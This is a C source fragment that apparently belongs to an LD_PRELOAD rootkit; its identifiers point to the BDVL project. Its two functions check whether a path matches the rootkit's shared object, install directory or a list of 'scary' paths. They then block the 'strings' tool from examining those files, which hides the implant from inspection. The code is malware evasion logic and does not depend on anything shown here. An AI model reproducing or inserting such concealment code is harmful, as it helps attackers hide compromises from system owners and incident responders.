int scary_path(char *string){
    if(xstrstr(BDVLSO, string) || 
        xstrstr(INSTALL_DIR, string))
        return 1;

    for(int i = 0; i < SCARY_PATHS_SIZE; i++)
        if(!xfnmatch(scary_paths[i], string) ||
            !xstrncmp(scary_paths[i], string) ||
            xstrstr(scary_paths[i], string)) return 1;

    return 0;
}

int block_strings(char *const argv[]){
    if(argv[0] == NULL || !xfnmatch(STRINGS_PATH, argv[0]))
        return 0;

    for(int i = 0; argv[i] != NULL; i++)
        if(scary_path(argv[i])) return 1;

    return 0;
}